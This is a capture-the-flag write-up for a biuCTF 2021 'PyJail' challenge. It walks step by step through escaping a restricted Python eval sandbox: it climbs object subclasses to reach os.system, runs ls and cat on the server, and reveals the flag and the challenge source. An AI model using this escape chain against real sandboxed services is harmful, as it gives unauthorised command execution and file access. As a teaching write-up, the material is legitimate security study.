# PyJail - biuCTF 2021

Let's connect to the server. In first glance, it's seems like a very restricted python shell that doesn't allow us to do almost anything and the only function that works is ```print```. After some experiment in the PyJail we can see that we can also call the ```__dir__``` method, which returns all variables and methods of an object. so lets run:
```python
print(print.__dir__())
```
and we get all themethods of the function class:
```python
['__repr__', '__hash__', '__call__', '__getattribute__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__reduce__', '__module__', '__doc__', '__name__', '__qualname__', '__self__', '__text_signature__', '__str__', '__setattr__', '__delattr__', '__init__', '__new__', '__reduce_ex__', '__subclasshook__', '__init_subclass__', '__format__', '__sizeof__', '__dir__', '__class__']
```
Now, using ```print.__class__```, we have access to a ```class``` object (specifically, the ```builtin_function_or_method``` class). Now we can use the ```__bases__``` method to accsess all the classes that ```builtin_function_or_method``` inheritence from:
```python
print(print.__class__.__bases__)
```
And we get ```(<class 'object'>,)```, which is the default class to inherit from in python. Now we use the ```__subclasses__``` method to get all subclasses of ```object```:
```python
print(print.__class__.__bases__[0].__subclasses__())
```
We get:
```python
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'pickle.PickleBuffer'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class 'Context'>, <class 'ContextVar'>, <class 'Token'>, <class 'Token.MISSING'>, <class 'moduledef'>, <class 'module'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class '_ast.AST'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc_data'>, <class 'abc.ABC'>, <class 'dict_itemiterator'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>]
```

WOAH, thats a lot of information. but the class that attract us the most is ```os._wrap_close``` (index 133 in the list), since the desription of the challenge hints us that we should "gain knowledge about the system". After a quick search in google, it doesn't seems like the class itself can help us. But we can get access to the ```os``` module from it using ```__module__``` method. Unfortunately, we get the name of the module as a string, which doesn't really help us.
But we can get access to all of the functions in ```os``` with:
```python
print(print.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__)
```
The variable ```__globals__``` hold a dictionary that holds all of the global variables in the module of a function (in our case the ```os``` module).
Now we have access to the ```system```. The ```system``` function executes a command on a shell. let's call the ```ls``` command by:
```python
print.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['system']('ls')
```
We get:
```
Dockerfile
README.md
ctf.xinetd
main.py
start.sh
```

Now we will read all the files using:
```python
print.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['system']('cat <filename>')
```
After reading all the files, we find the flag in ```main.py```:
```
def flag():
    flag = "biuCTF{T3hr3_iS_A_L0+_+0_d0_In_+HiS_PYjaIl!}"
    print("Is'nt that easy pal? Read the flag constant in this function now :)")

def globs():
    return globals()


def main():
    for _ in range(10):
        try:
            _ = eval(
                input("There is not much to do in this pyjail\n"),
                {'globals': globs, '__builtins__': {'print': print}}
            )
        except NameError as e:
            print("I have no idea what '{}' means".format(str(e.args).split('\'')[1]))
        except Exception as e:
            print("Something went wrong pal")


if __name__ == '__main__':
    main()
```
